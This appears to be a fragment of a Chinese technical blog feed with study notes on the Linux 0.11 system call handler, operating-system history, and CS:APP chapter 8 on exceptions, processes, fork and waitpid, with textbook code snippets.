-<h3 id="中断处理程序：system"><a href="#中断处理程序：system" class="headerlink" title="中断处理程序：system"></a>中断处理程序：system</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nr_system_call=72</span><br><span class="line">.globl _system_call</span><br><span class="line">_system_call:</span><br><span class="line">	cmpl $nr_system_call-1,%eax	</span><br><span class="line">	//eax存放的是系统调用号</span><br><span class="line">	//eax=nr_write,系统调用号</span><br><span class="line">	ja bad_sys_call</span><br><span class="line">	push %ds</span><br><span class="line">	push %es</span><br><span class="line">	push %fs</span><br><span class="line">	</span><br><span class="line">	pushl %edx</span><br><span class="line">	pushl %ecx</span><br><span class="line">	pushl %ebx</span><br><span class="line">	//调用的参数</span><br><span class="line">	movl $0x10,%edx</span><br><span class="line">	mov %dx,%ds</span><br><span class="line">	mov %dx,%es</span><br><span class="line">	//内核数据</span><br><span class="line">	movl $0x17,%edx</span><br><span class="line">	mov %dx,fs</span><br><span class="line">	//fs可以找到用户数据</span><br><span class="line">	call _sys_call_table(,%eax,4)</span><br><span class="line">	//_sys_call_table+4*eax就是相应系统调用处理函数入口</span><br><span class="line">	//这里乘4是因为这个表里每一项都是一个函数地址4个字节</span><br><span class="line">	pushl %eax</span><br><span class="line">	//返回值压栈，留着ret_from_sys_call时用</span><br><span class="line">	...</span><br><span class="line">ret_from_sys_call:</span><br><span class="line">	popl %eax,其他pop,iret</span><br></pre></td></tr></table></figure>
-
-<h3 id="sys-call-table"><a href="#sys-call-table" class="headerlink" title="_sys_call_table"></a>_sys_call_table</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fn_ptr_call_table[]=</span><br><span class="line">&#123;</span><br><span class="line">    sys_setup,sys_exit,sys_fork,sys_read,sys_write,</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>call _sys_call_table(,%eax,4)依据上表就是call sys_write</p>
-<p><img src="24.png"></p>
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><img src="25.png"></p>
-<h2 id="操作系统历史"><a href="#操作系统历史" class="headerlink" title="操作系统历史"></a>操作系统历史</h2><h3 id="操作系统的开端"><a href="#操作系统的开端" class="headerlink" title="操作系统的开端"></a>操作系统的开端</h3><ul>
-<li><p>（1955-1965）计算机非常昂贵，上古神机IBM7094,造价250万美元以上</p>
-<ul>
-<li>计算机使用原则：只专注于计算</li>
-<li>批处理操作系统（Batch syste）</li>
-<li>典型代表：<strong>IBSYS监控系统</strong></li>
-</ul>
-<p><img src="26.png"></p>
-</li>
-<li><p>计算机开始进入多个行业：科学计算（IBM 7094）,银行（IBM1401）</p>
-<ul>
-<li>需要一台计算机干多个事情</li>
-<li>多道程序：在计算机内存中同时存放几道相互独立的程序，使它们在管理程序控制下，相互穿插运行，两个或两个以上程序在计算机系统中同处于开始到结束之间的状态, 这些程序共享计算机系统资源。</li>
-<li>作业之间的切换和调度成为核心：因为既有IO认为，又有计算任务，需要让CPU忙碌，例如：读写磁盘时不让CPU闲置，执行下一任务，等读写结束，回到上一任务。<strong>多进程结构和进程管理萌芽。</strong></li>
-<li>典型代表：<strong>IBM OS/360</strong>（360待变全方位服务），开发周期5000个人年</li>
-</ul>
-</li>
-<li><p>计算机进入多个行业，使用人数增加</p>
-<ul>
-<li>如果每个人启动一个作业，作业之间快速切换</li>
-<li>分时系统：分时操作系统将系统<a href="https://baike.baidu.com/item/%E5%A4%84%E7%90%86%E6%9C%BA/128842">处理机</a>时间与内存空间按一定的时间间隔，轮流地切换给各终端用户的程序使用。由于时间间隔很短，每个用户的感觉就像他独占计算机一样。</li>
-<li>代表：MIT MULTICS</li>
-<li>核心仍然是任务切换，但是资源复用的思想对操作系统影响很大，虚拟内存就是一种复用。</li>
-</ul>
-</li>
-<li><p>小型计算机出现，PDP-1每台售价120000美元</p>
-<ul>
-<li>越来越多的人可以使用计算机</li>
-<li>1969年：贝尔实验室的Ken Thompson、Dennis Ritchi等在一台没人使用的PDP-7上开发了一个简化的MULTICS，就是后来的UNIX。</li>
-</ul>
-</li>
-<li><p>1981，IBM推出IBM PC。个人计算机开始普及</p>
-<ul>
-<li>很多人可以用计算机并接触UNIX</li>
-<li>1987年Andrew Tanenbaum发布了MINIX用于教学</li>
-<li>Linus Torvalds在386sx兼容微机上学习minix，做出了小Linux于1991年发布</li>
-<li>1994年，Linux1.0发布并采用GPL协议，1998年以后互联网世界开展了一场Linux产业化运动</li>
-</ul>
-</li>
-</ul>
-<h4 id="核心思想、技术："><a href="#核心思想、技术：" class="headerlink" title="核心思想、技术："></a>核心思想、技术：</h4><ol>
-<li>用户通过执行程序来使用计算机（与冯诺依曼的思想吻合）</li>
-<li>作为管理者，操作系统要让多个程序合理推进，就是<strong>进程管理</strong></li>
-<li>多进程（用户）推进时需要内存复用</li>
-<li>等等…</li>
-</ol>
-<p>多进程结构是操作系统基本图谱。</p>
-<h3 id="PC与DOS"><a href="#PC与DOS" class="headerlink" title="PC与DOS"></a>PC与DOS</h3><ul>
-<li>PC机的诞生一定会导致百花齐放。IBM推出PC，自然要给机器配一个操作系统<ul>
-<li>1975年Digital Research为Altair 8800开发了操作系统CP/M</li>
-<li>CP/M：写命令给用户用，执行命令对应的程序，单任务执行</li>
-<li>1980出现了8086 16位芯片，在CP/M基础上开发了QDOS</li>
-</ul>
-</li>
-<li>Bill Gates进入历史舞台<ul>
-<li>1975年与Paul Allen为Altair 8800开发了BASIC解释器，开创了微软</li>
-<li>1977年开发FAT管理磁盘</li>
-<li>QDOS的成功在于以CP/M为基础将BASIC和FAT包含了进来<ul>
-<li>文件管理和编程环境都是用户所关心的。</li>
-</ul>
-</li>
-<li>1981年微软买下了QDOS，改名为MS-DOS，与IBM PC打包出售</li>
-</ul>
-</li>
-</ul>
-<h4 id="从MS-DOS到Windows"><a href="#从MS-DOS到Windows" class="headerlink" title="从MS-DOS到Windows"></a>从MS-DOS到Windows</h4><ul>
-<li>MS-DOS的磁盘、文件、命令让用起来更方便，但可以更方便<ul>
-<li>1989，MS-DOS4.0出现，支持了鼠标和键盘</li>
-<li>Windows3.0大获成功</li>
-<li>之后出现了95，XP，Vista，Win 7。。。</li>
-<li>文件、开发环境、图形界面对于OS的重要性</li>
-</ul>
-</li>
-</ul>
-<h4 id="核心思想、技术：-1"><a href="#核心思想、技术：-1" class="headerlink" title="核心思想、技术："></a>核心思想、技术：</h4><ol>
-<li>仍然是程序执行、多进程、程序带动其他设备使用的基本结构</li>
-<li>开始重视用户的体验：各种文件、编程环境、图形界面</li>
-</ol>
 ]]></content>
       <categories>
-        <category>操作系统</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>深入理解计算机系统三</title>
-    <url>/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/</url>
-    <content><![CDATA[<h2 id="第八章：异常控制流"><a href="#第八章：异常控制流" class="headerlink" title="第八章：异常控制流"></a>第八章：异常控制流</h2><p><strong>控制流：</strong></p>
-<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/78.png" class="">
-
-<h4 id="8-1-异常"><a href="#8-1-异常" class="headerlink" title="8.1 异常"></a>8.1 异常</h4><p>​    异常是异常控制流的一种形式，一部分由硬件实现，一部分由操作系统实现，这一节中主要是对异常和异常处理有一个一般性的了解。异常就是控制流中的突变，用来相应处理器状态中的某些变化。</p>
-<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/79.png" class="">
-
-<p>在任何情况下，当处理器检测到有事件发生，会通过一张叫<strong>异常表</strong>的跳转表，进行一个间接过程调用（异常），到一个专门设计用来处理这类时间的操作系统子程序（<strong>异常处理程序</strong>）。</p>
-<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/80.png" class="">
-
-<p>当异常处理程序完成以后，根据引起异常的事件类型会发生以下三种情况的一种：</p>
-<ol>
-<li><p>处理程序将控制返回给当前的指令Icurr，即当事件发生时正在执行的指令。</p>
-</li>
-<li><p>处理程序将控制返回给Inext，如果没有发生异常将会执行的下一条指令。</p>
-</li>
-<li><p>处理程序终止被中断的程序。</p>
-</li>
-</ol>
-<h5 id="8-1-1-异常处理"><a href="#8-1-1-异常处理" class="headerlink" title="8.1.1 异常处理"></a>8.1.1 异常处理</h5><p>系统中为每种类型的异常分配了唯一的非负整数的异常号，一些是处理器的设计者分配的，其他是操作系统内核设计者分配的。</p>
-<ul>
-<li>​    前者包括被0除，缺页，内存访问违例，断点及算术溢出。</li>
-<li>​    后者包括系统调用和来自外部IO设备的信号。</li>
-</ul>
-<p>系统启动时，会初始化一张异常表的跳转表，使条目k包含异常k的处理程序地址。</p>
-<p>在运行时，处理器检测到发生了一个事件，并确定了相应的<strong>异常号</strong>k，随后，处理器触发异常，方法是执行间接过程调用，通过异常表的条目k转到相应的处理程序。</p>
-<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/80.png" class="">
-
-<p>异常表的起始地址放在一个叫做<strong>异常表基质寄存器</strong>的特殊CPU寄存器中。</p>
-<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/81.png" class="">
-
-<p>异常处理过程类似于调用但有一些不同：</p>
-<ul>
-<li>过程调用时，在跳转到处理程序之前，处理器将返回地址压入栈中，然而根据异常的类型，返回地址要么是当前指令，要么是下一条指令。</li>
-<li>处理器也把一些额外的处理器状态压入栈里，在处理程序返回时，重新开始执行被中断的程序可能会需要这些状态。</li>
-<li>如果控制从用户程序转移到内核，所有这些项目都被压入栈中，而不是用户栈中。</li>
-<li>异常处理程序运行在内核模式下，意味着它们对所有的系统资源都有完全的访问权限。</li>
-</ul>
-<h5 id="8-1-2-异常的类型"><a href="#8-1-2-异常的类型" class="headerlink" title="8.1.2 异常的类型"></a>8.1.2 异常的类型</h5><p>异常可以分为四类：中断、陷阱、故障、终止。</p>
-<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/84.jpg" class="">
-
-<p><strong>中断：</strong></p>
-<p>中断是<strong>异步</strong>发生的，来自处理器外部的I/O设备的信号的结果。</p>
-<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/82.png" class="">
-
-<p>在当前指令完成执行之后，处理器注意到中断引脚的电压变高了，就从系统总线读取异常号，然后调用适当的中断程序。当处理程序返回时，它就将控制返回给下一条指令。结果就好像程序继续执行，好像没有发生过中断一样。</p>
-<p>剩下的异常类型（陷阱、故障和终止）是同步执行的，是执行当前指令的结果，我们把这类指令叫做<strong>故障指令</strong>。</p>
-<p><strong>陷阱和系统调用:</strong></p>
-<p>陷阱是有意的异常，是执行一条指令的结果。</p>
-<p>陷阱最重要的用途是在用户程序和内核之间提供一个像过程一样的接口，叫做<strong>系统调用</strong>。</p>
-<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/82.5.png" class="">
-
-<p>​    用户程序经常需要向内核请求服务。为了允许对这些服务的受控访问，处理器提供了一条特殊的“syscall n”指令，当用户程序想要请求服务n时，可以执行这条指令。执行syscall指令会导致一个到异常处理程序的陷阱，这个 处理程序解析参数，并调用适当的内核程序。</p>
-<p>​    函数调用是在用户模式，系统调用在内核模式。</p>
-<p><strong>故障和终止：</strong></p>
-<p>故障是由错误情况引起的，它可能被故障处理程序修正。如果被修正，则将控制转移到当前指令。</p>
-<p>如果不可修正，则终止，终止处理程序不会将控制返回给应用程序。将返回一个abort例程，该例程将终止程序。</p>
-<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/83.png" class="">
-
-<h5 id="8-1-3-Linux-x86-64系统中的异常"><a href="#8-1-3-Linux-x86-64系统中的异常" class="headerlink" title="8.1.3 Linux/x86-64系统中的异常"></a>8.1.3 Linux/x86-64系统中的异常</h5><img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/85.png" class="">
-
-<ol>
-<li><p><strong>Linux/x86-64故障和终止：</strong></p>
-<ul>
-<li>除法错误。</li>
-<li>一般保护故障。通常是一个程序引用了一个未定义的虚拟内存空间，或者程序试图写一个只读的文本。Linux shell一般报告为“段故障”</li>
-<li>缺页是会重新执行产生故障的指令的一个异常示例。</li>
-<li>机器检查。机器检查是在导致故障的指令执行中检查到致命的硬件错误时发生的。</li>
-</ul>
-</li>
-<li><p><strong>Linux/x86-64系统调用：</strong></p>
-<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/86.png" class=""></li>
-</ol>
-<h4 id="8-2-进程"><a href="#8-2-进程" class="headerlink" title="8.2 进程"></a>8.2 进程</h4><p>​    在现代操作系统上运行一个程序时，会得到一个假象，就好像程序时目前系统中唯一的程序，程序似乎独占处理器和内存等等假象都通过进程的概念提供给我们的。</p>
-<pre><code> 进程提供给应用程序的关键抽象：
-</code></pre>
-<ul>
-<li>一个独立的逻辑控制流，它提供一个假象，好像我们的程序独占的使用处理器。</li>
-<li>一个私有的地址空间，提供一个假象，好像我们的程序独占的使用内存系统。</li>
-</ul>
-<h5 id="8-2-1-逻辑控制流"><a href="#8-2-1-逻辑控制流" class="headerlink" title="8.2.1 逻辑控制流"></a>8.2.1 逻辑控制流</h5><p>​    即使在系统中通常有许多其他程序在运行，进程也可以像每个程序提供一种假象，好像它在独占的使用处理器，如果想用调试器单步执行程序，会看到一系列PC值，这些值唯一的对应包含在程序的可执行目标文件中的指令，或是包含在运行时动态连接到程序的共享对象的指令，这个PC值的序列叫做<strong>逻辑控制流</strong>。</p>
-<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/87.png" class="">
-
-<h5 id="8-2-2-并发流"><a href="#8-2-2-并发流" class="headerlink" title="8.2.2 并发流"></a>8.2.2 并发流</h5><p>计算机系统中逻辑流有许多不同形式，异常处理程序、进程、信号处理程序、线程等都是逻辑流的例子。</p>
-<p>一个逻辑流的执行在时间上与另一个流重叠，称为<strong>并发流</strong>。</p>
-<p>时间片：一个进程执行它的控制流的一部分的每一时间段。</p>
-<p>多任务：一个进程和其他进程轮流运行（也叫时间分片）</p>
-<p>并发：多个流并发执行的一般现象。</p>
-<p>并行流：两个流并发的运行在不同的处理机核或者计算机上，它们并行地运行。</p>
-<h5 id="8-2-3-私有地址空间"><a href="#8-2-3-私有地址空间" class="headerlink" title="8.2.3 私有地址空间"></a>8.2.3 私有地址空间</h5><p>私有地址空间—进程为程序提供的假象，好像它独占的使用系统地址空间。一般而言，和这个空间中某个地址相关联的那个存储器字节是不能被其他进程读写的。</p>
-<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/88.png" class="">
-
-<h5 id="8-2-4-用户模式和内核模式"><a href="#8-2-4-用户模式和内核模式" class="headerlink" title="8.2.4 用户模式和内核模式"></a>8.2.4 用户模式和内核模式</h5><p>​    处理器提供一种机制，限制一个应用可以执行的指令以及它可以访问的地址空间范围。通常是通过控制某个寄存器的模式位来提供这种功能，该寄存器描述了进程当前享有的特权。</p>
-<ul>
-<li>​    设置模式位之后，进程出域内核模式，也叫做超级用户模式，这个进程可以执行指令集中的任何指令，并且可以访问系统中的任何内存位置。</li>
-<li>​    没有设置模式位，进程运行在用户模式，用户模式中的进程不允许执行特权指令，比如停止处理器、改变模式位、发起IO操作、不允许引用地址空间中内核区的代码和数据，这样的尝试都会引起故障。用户程序必须通过系统调用接口间接的访问内核代码和数据。</li>
-</ul>
-<p> linux提供了一种机制，叫做/proc文件系统，允许用户模式进程访问内核数据结构中的内容。</p>
-<p>/proc文件系统将许多内核数据的内容输出为一个用户程序可以读的文本文件的层次结构。</p>
-<h5 id="8-2-5-上下文切换"><a href="#8-2-5-上下文切换" class="headerlink" title="8.2.5 上下文切换"></a>8.2.5 上下文切换</h5><p>​    操作系统内核使用一种称为上下文切换的较高层次的异常控制流来实现多任务。上下文切换机制是建立在上面讨论过的低层的异常机制上的。</p>
-<p>​    内核为每个进程维持一个<strong>上下文</strong>，上下文就是内核重新启动一个被抢占的进程所需要的状态，由一些对象的值组成，包括通用目的寄存器、浮点寄存器、程序计数器、用户栈、状态寄存器、内存栈和各种内核数据结构，比如描述地址空间的页表、包含当前进程信息的进程表，以及包含进程已打开文件的信息的文件表。</p>
-<p>下图为一对进程上下文切换的示例，进程A初始运行在用户模式在，直到执行系统调用read陷入内核，内核中的陷阱处理程序请求来自磁盘控制器的DMA传输，并安排在磁盘控制器完成从磁盘到内存的数据传输后，磁盘中断处理器：</p>
-<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/89.png" class="">
-
-<p>上下文切换：</p>
-<ol>
-<li>保存当前进程的上下文。</li>
-<li>恢复某个先前被强占的进程被保存的上下文。</li>
-<li>将控制传递给这个新恢复的进程。</li>
-</ol>
-<h4 id="8-3-系统调用错误处理"><a href="#8-3-系统调用错误处理" class="headerlink" title="8.3 系统调用错误处理"></a>8.3 系统调用错误处理</h4><img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/90.png" class="">
-
-<h4 id="8-4-进程控制"><a href="#8-4-进程控制" class="headerlink" title="8.4 进程控制"></a>8.4 进程控制</h4><h5 id="8-4-1-获取进程ID"><a href="#8-4-1-获取进程ID" class="headerlink" title="8.4.1 获取进程ID"></a>8.4.1 获取进程ID</h5><p>每个进程都有唯一的正数（非0）进程ID（PID），getpid函数返回调用进程的PID，getppid函数返回他的父进程的PID（创建调用进程的进程）。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">pid_t</span> <span class="title">getpid</span><span class="params">(<span class="keyword">void</span>)</span>；</span></span><br><span class="line"><span class="function"><span class="keyword">pid_t</span> <span class="title">getppid</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br></pre></td></tr></table></figure>
-
-<p>在Linux系统上pid_t被定义为int类型。</p>
-<h5 id="8-4-2-创建和终止进程"><a href="#8-4-2-创建和终止进程" class="headerlink" title="8.4.2 创建和终止进程"></a>8.4.2 创建和终止进程</h5><p>从程序员角度，可以认为进程总是处于下面三种状态之一：</p>
-<ul>
-<li>运行。进程要么在CPU上执行，要么在等待被执行且最终会被内核调度。</li>
-<li>停止。进程的执行被挂起，且不会被调度，当收到SIGSTOP、SIGTSTP、SIGTTIN或者SIGTTOU信号时，进程会停止，并保持停止直到它收到一个SIGCONT信号，在这个时刻，进程再次开始运行。</li>
-<li>终止。进程永远的停止，进程会因为三种原因终止：<ol>
-<li>收到一个信号，该信号的默认行为是终止进程。</li>
-<li>从主程序返回。</li>
-<li>调用exit函数。</li>
-</ol>
-</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">exit</span><span class="params">(<span class="keyword">int</span> status)</span></span>;</span><br></pre></td></tr></table></figure>
-
-<p>exit函数以status退出状态来终止进程（另一种设置退出状态的方法是从主程序返回一个整数值）。父进程调用fork函数创建一个新的运行的子进程。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">pid_t</span> <span class="title">fork</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br></pre></td></tr></table></figure>
-
-<p>​    新创建的子进程几乎但不完全与父进程相同，子进程得到与父进程用户级虚拟地址空间相同的但是独立的一个副本，包括代码和数据段、堆、共享库以及用户栈。子进程还获得与父进程任何打开文件描述符相同的副本，这就意味着父进程调用fork时，子进程可以读写父进程中打开的任何文件父进程和新创建的子进程最大的区别在于他们有不同的PID。<br>​     fork函数有趣的在于它调用一次，但是会返回两次，一次是在调用进程（父进程）中，一次是在新创建的子进程中。在父进程中fork返回的是子进程的PID，在子进程中fork返回0。因为子进程的PID总是非0，返回值就明确的分辨出程序是在父进程还是在子进程。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;csapp.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">pid_t</span> pid;</span><br><span class="line">	<span class="keyword">int</span> x=<span class="number">1</span>;</span><br><span class="line">	pid=Fork();</span><br><span class="line">	<span class="keyword">if</span>(pid==<span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//子进程</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;child:x = %d\n&quot;</span>,++x);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;parent :x=%d\n &quot;</span>,--x);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/91.png" class="">
-
-<p> 从上述可以看到：</p>
-<ol>
-<li><p>调用一次，返回两次。fork函数被父进程调用一次，却返回两次。一次是返回到父进程，一次是返回到新创建的子进程。</p>
-</li>
-<li><p>并发执行。父进程和子进程是并发运行的独立进程，内核能以任意方式交替执行它们的逻辑控制流中的指令。</p>
-</li>
-<li><p>相同但是独立的地址空间。</p>
-</li>
-<li><p>共享文件。子进程共享了父进程打开的文件，stdout。所以子进程输出也是指向屏幕。</p>
-</li>
-</ol>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   Fork();</span><br><span class="line">   Fork();</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">   <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/92.png" class="">
-
-<h5 id="8-4-3-回收子进程"><a href="#8-4-3-回收子进程" class="headerlink" title="8.4.3 回收子进程"></a>8.4.3 回收子进程</h5><p>​    当一个进程由于某种原因终止时，内核并不是立即把它从系统中清除，相反进程被保持在一种已终止的状态中，直到被父进程回收，当父进程回收已终止的子进程时，内核将子进程的退出状态传递给父进程，然后抛弃已终止的进程。从此时开始，该进程就不存在了。一个终止了但没有被回收的进程称为僵尸进程。</p>
-<p>​    如果一个父进程终止了，内核会安排init进程称为它的孤儿进程（如果父进程先退出,子进程还没退出那么子进程将被 托孤给init进程）的养父。init进程的PID为1，是系统在启动时由内核创建的，他不会终止，是所有进程的祖先。如果父进程没有回收它的僵尸进程就终止了，那么内核会安排init进程回收它们，长时间运行的程序，比如shell或者服务器，总是应该回收它们的僵尸子进程，即使僵尸进程没有运行，仍然会消耗系统的内存资源。一个进程可以通过调用waitpid函数等待它的子进程终止或停止。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//成功返回子进程pid，WNOHANG则为0,其他错误-1</span></span><br><span class="line"><span class="function"><span class="keyword">pid_t</span> <span class="title">waitpid</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">int</span> *statusp, <span class="keyword">int</span> options)</span></span>;</span><br></pre></td></tr></table></figure>
-
-<p>默认情况下，options=0时，waitpid挂起调用进程的执行，直到它的等待集合中一个子进程终止，如果等待集合中的一个进程在刚调用的时候就已经终止，那么waitpid立即返回。在这两种情况下，waitpid返回导致waitpid返回的已终止子进程的PID。此时，已终止的子进程已经被回收，内核会从系统中删除掉它的所有痕迹。</p>
-<ol>
-<li><p>判定等待集合的成员</p>
-<ul>
-<li>如果pid&gt;0，那么等待集合就是一个单独的子进程，它的进程ID等于pid</li>
-<li>如果pid=-1，那么等待集合就是由父进程所有的子进程组成</li>
-</ul>
-</li>
-<li><p>修改默认行为</p>
-<p>可以通过将options设置为常量WNOHANG、WUNTRACED和WCONTINUED的各种组合修改默认行为。</p>
-<ul>
-<li>WNOHANG：如果等待集合中的任何子进程都还没有终止，那么就立即返回，返回值为0，默认的行为是挂起调用进程，直到有子进程终止，在等待子进程终止的同时如果还有想做的工作，这个选项会有用。</li>
-<li>WUNTRACED：挂起调用进程的执行，直到等待集合中一个进程变成已终止或者已经被停止，返回的PID为呆滞返回的已终止或被停止的子进程的PID，默认的行为是只返回已终止的子进程。当想要金叉已终止和被停止的子进程时会有用。</li>
-<li>WCONTINUED：挂起调用进程的执行，直到等待集合中一个正在运行的进程终止，或等待集合中和一个被停止的进程收到SIGCONT信号重新开始执行。</li>
-</ul>
-<p>可以用或运算把这些选项组合起来。</p>
-</li>
-<li><p>检查已回收子进程的退出状态</p>
-<p>如果statusp参数是非空的，那么waitpid就会在status中放上关于导致返回子进程的状态信息，status是statusp指向的值。wait.h中定义了status参数的几个宏。</p>
-<ul>
-<li>WIFEXITED：如果子进程调用exit或者返回正常终止，就返回真。</li>
-<li>WEXITSTATUS：返回一个正常终止的子进程的退出状态，只有在WIFEXITED()返回为真时，才定义这个状态。</li>
-<li>WIFSIGNALED：如果子进程是因为一个未被捕获的信号终止的，那么就返回真。</li>
-<li>WTERMSIG：返回导致子进程终止的信号的编号，只有在WIFSIGNALED()返回为真时，才定义这个状态。</li>
-<li>WIFSTOPPED：如果引起返回的子进程当前是停止的，那么返回真。</li>
-<li>WSTOPSIG：返回引起子进程停止的信号的编号。只有在WIFSTOPPED()返回为真才定义这个状态。</li>
-<li>WIFCONTINUED：如果子进程收到SIGCONT信号重新启动，则返回真。</li>
-</ul>
-</li>
-<li><p>错误条件</p>
-<p>如果调用进程没有子进程，那么waitpid返回-1，并设置errno为ECHILD。如果waitpid函数被一个信号中断，那么返回-1，并设置erron为EINTR。</p>
-</li>
-<li><p>wait函数</p>
-<p>wait函数是waitpid函数的简单版本。</p>
-<p>调用wait(&amp;status)等价于调用waitpid(-1,&amp;status,0)。</p>
-</li>
-</ol>
-<h5 id="8-4-4-让进程休眠"><a href="#8-4-4-让进程休眠" class="headerlink" title="8.4.4 让进程休眠"></a>8.4.4 让进程休眠</h5><p>sleep函数将一个进程挂起一段时间。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sleep</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> secs)</span></span>;</span><br></pre></td></tr></table></figure>
-
-<p>如果请求的时间量已经到了，sleep返回0，否则返回还剩下的要休眠的秒数，后一种情况是可能的，如果sleep函数被一个信号中断而过早的返回，还有一个有用的函数是pause函数，该函数让调用函数休眠，直到进程收到一个信号。</p>
